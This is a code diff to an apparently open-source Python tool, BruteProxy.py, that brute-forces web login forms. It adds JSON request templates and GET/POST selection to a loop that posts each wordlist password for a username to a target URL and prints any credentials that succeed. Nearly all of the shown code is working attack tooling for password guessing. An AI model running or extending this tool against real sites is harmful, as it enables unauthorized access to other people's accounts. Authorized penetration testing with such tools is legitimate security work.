@@ -1,5 +1,7 @@
 import requests
 from Modules.Utilities import utilities
+import json
+import re
 
 class colors:
     HEADER = '\033[95m'
@@ -28,11 +30,28 @@ class attacker:
         attacker.proxylist = [(line.strip()).split() for line in b_file]
         b_file.close()
 
-    def attack(self, target, username, wordlist, proxylist, errIdentfier, usernameParameterName, passwordParameterName):
-        # set us some flags and counters
+    def setup(self, method, custom_request):
+        attacker.method = method
+        attacker.custom_request = custom_request
+
+    def attack(self, target, username, wordlist, proxylist, errIdentfier, username_parameter, password_parameter):
+        # set us some flags, counters and null vars
         creds_found = False
         badResponse_counter = 0
         wantsContinue = False
+
+        # check if user wants custom request, parse it from request.json if so
+        if attacker.custom_request == "True" or attacker.custom_request == "true":
+            # he wants, error handle loading a file
+            try:
+                with open('request.json', 'r') as custom_request_json:
+                    request_template_raw = custom_request_json.read()
+            except:
+                print(colors.OKCYAN + "[" + colors.FAIL + colors.BOLD + "!" + colors.ENDC + colors.OKCYAN + "]" + " " + colors.ENDC + colors.FAIL + "Unable to read request template. Make sure that it is in BruteProxy.py root dir and is named \"request.json\"." + colors.ENDC)
+                return 0
+        else:
+            # he don't want, just set it to default
+            request_template_raw = "{\"" + username_parameter + "\": \"$username$\", \"" + password_parameter + "\": \"$password$\"}"
 
         # firstly, let's generate some dicts AND error handle this process, since this is very fishy
         try:
@@ -48,9 +67,18 @@ class attacker:
                     try:
                         print(colors.OKCYAN + "[" + colors.OKBLUE + colors.BOLD + "i" + colors.ENDC + colors.OKCYAN + "]" + " " + colors.ENDC + colors.DARK_CYAN + "Executing attack, we'll let you know if we find something..." + colors.ENDC)
                         for currentPwdNum in range(0, len(attacker.wordlist)):
+                            # prepare paswords in current try
                             password = attacker.wordlist[currentPwdNum]
-                            currentPOSTobj = {usernameParameterName: username, passwordParameterName: password}
-                            currentRequest = requests.post(target, data = currentPOSTobj)
+                            human_readble_pwd = str(password).replace("[", "").replace("]", "").replace("'", "")
+                            # replace variables in template and convert it into dict
+                            request_template = request_template_raw.replace("$username$", username).replace("$password$", human_readble_pwd)
+                            currentRequestObj = json.loads(request_template)
+
+                            # decide on GET or POST method
+                            if attacker.method == "post":
+                                currentRequest = requests.post(target, data = currentRequestObj)
+                            elif attacker.method == "get":
+                                currentRequest = requests.get(target, data = currentRequestObj)
 
                             # request sent, let's evalute the response
                             currentResponse__text = currentRequest.text
@@ -64,7 +92,7 @@ class attacker:
                                 # greet a user with a great news
                                 print(colors.OKCYAN + "[" + colors.OKGREEN + colors.BOLD + "\u2713" + colors.ENDC + colors.OKCYAN + "]" + " " + colors.ENDC + colors.DARK_CYAN + "SUCCESS! Correct credentials were found. Enjoy and thank you for using BruteProxy.py :)" + colors.ENDC)
                                 print(colors.OKCYAN + "[] " + colors.ENDC + "     " + colors.BOLD + "Username: " + colors.ENDC + username)
-                                print(colors.OKCYAN + "[] " + colors.ENDC + "     " + colors.BOLD + "Password: " + colors.ENDC + str(attacker.wordlist[currentPwdNum]))
+                                print(colors.OKCYAN + "[] " + colors.ENDC + "     " + colors.BOLD + "Password: " + colors.ENDC + human_readble_pwd)
 
                                 # before we actaully end loop, if the user has not specified or wrongly specified the error identifier, the very first password will popup
                                 # as correct, since it did not find that value in response, so we can theoretically detect that and only inform the user about this
@@ -89,8 +117,7 @@ class attacker:
                                         # user responded no, end a loop
                                         badResponse_counter = 0
                                         print(colors.OKCYAN + "[" + colors.OKBLUE + colors.BOLD + "i" + colors.ENDC + colors.OKCYAN + "]" + " " + colors.ENDC + colors.DARK_CYAN + "OK. Ending the main loop. Try to check if target parameter is set up correctly." + colors.ENDC)
-                                        return 0
-                                        break                                
+                                        return 0                            
                                 elif wantsContinue == False:
                                     # we're still trying, increase the counter and print out an info
                                     print(colors.OKCYAN + "[" + colors.WARNING + colors.BOLD + "!" + colors.ENDC + colors.OKCYAN + "] " + colors.ENDC + colors.WARNING + "Recived error code " + colors.BOLD + str(currentResponse__code) + colors.ENDC + colors.WARNING + ". Trying again..." + colors.ENDC)
